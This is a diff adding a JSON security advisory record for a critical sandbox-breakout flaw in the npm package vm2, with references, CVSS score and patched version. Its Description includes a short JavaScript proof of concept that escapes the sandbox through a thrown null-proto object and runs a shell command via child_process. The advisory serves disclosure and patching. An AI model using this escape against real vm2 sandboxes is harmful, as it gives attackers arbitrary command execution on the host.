@@ -1,0 +1,53 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-05-08T16:20:58Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "vm2"
+  },
+  "Advisory": {
+    "DatabaseId": 354244,
+    "Id": "GSA_kwCzR0hTQS05dmczLTRyZmotd2djbc4ABWfE",
+    "GhsaId": "GHSA-9vg3-4rfj-wgcm",
+    "References": [
+      {
+        "Url": "https://github.com/patriksimek/vm2/security/advisories/GHSA-9vg3-4rfj-wgcm"
+      },
+      {
+        "Url": "https://github.com/patriksimek/vm2/releases/tag/v3.11.2"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-9vg3-4rfj-wgcm"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-9vg3-4rfj-wgcm"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-44009"
+      }
+    ],
+    "Description": "### Summary\n\nVM2 suffers from a sandbox breakout vulnerability. This allows attackers to write code which can escape from the VM2 sandbox and execute arbitrary commands on the host system.\n\n### Details\n\nIn `handleException` due to ``// SECURITY (post-GHSA-mpf8 hardening): use `from` (not `ensureThis`)`` exceptions with a null proto will be assumed to come from the other side and being proxied. Therefore, it is possible to get the proxied and unproxied object of a sandbox object with a null proto when thrown and then catched which allows to get the host `Function` object.\n\n### PoC\n\n```js\nconst {VM} = require(\"vm2\");\nconst vm = new VM();\nconsole.log(vm.run(`\nconst o = {__proto__: null};\ntry {\n\tthrow o;\n} catch (e) {\n\te.f = Buffer.prototype.inspect\n\to.f.constructor(\"return process\")().mainModule.require('child_process').execSync('touch pwned');\n}\n`));\n```\n\n### Impact\n\nAttackers can perform Remote Code Execution under the assumption that arbitrary code can be executed inside the context of a vm2 sandbox.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-05-08T16:20:58Z",
+    "Severity": "CRITICAL",
+    "Summary": "vm2 has Sandbox Breakout Through Null Proto Exception",
+    "UpdatedAt": "2026-05-08T16:20:58Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 9.8,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "3.11.2"
+      },
+      "VulnerableVersionRange": "\u003c 3.11.2"
+    }
+  ]
+}
